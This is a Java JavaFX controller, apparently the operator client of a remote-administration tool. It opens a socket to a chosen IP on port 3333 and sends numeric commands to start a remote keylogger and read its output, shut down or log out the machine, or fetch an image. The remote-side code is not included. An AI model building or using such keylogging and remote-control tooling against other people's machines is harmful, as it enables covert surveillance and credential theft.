package client;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;
import javafx.scene.layout.Pane;
import javafx.stage.Stage;

import java.io.*;
import java.net.Socket;
import java.util.Optional;
import com.opencsv.CSVReader;
import com.opencsv.exceptions.CsvValidationException;

public class ClientController {

    @FXML
    private TextField textBox1;

    private Stage stage;
    private Scene scene;

    @FXML
    private Pane paneMain;

    private BufferedReader br;

    private BufferedWriter bw;

    private Socket s;
    private int connected = 0;
    public void connect(ActionEvent event) throws IOException
    {
        String ip = textBox1.getText();
        s = new Socket(ip, 3333);
        connected = 1;
        br = new BufferedReader(new InputStreamReader(s.getInputStream()));
        bw = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));
        paneMain.getChildren().clear();

    }

    public void clickedSystem(ActionEvent event) throws IOException
    {
        if (connected == 1) {
            Pane pane = new FXMLLoader(ClientController.class.getResource("clientSystem.fxml")).load();
            paneMain.getChildren().clear();
            paneMain.getChildren().add(pane);
        }
    }
    public void clickedKeylogger(ActionEvent event) throws IOException
    {
        bw.write(1);
        bw.flush();
        String line;
        while ((line = br.readLine()) != null)
        {
            System.out.println(line);
        }
    }
    public void clickedShutdown(ActionEvent event) throws IOException
    {
        bw.write(2);
        bw.flush();
    }

    public void clickedLogout(ActionEvent event) throws IOException
    {
        bw.write(3);
        bw.flush();
    }
    public void clickedImage(ActionEvent event) throws IOException
    {
        bw.write(4);
        bw.flush();
    }
}
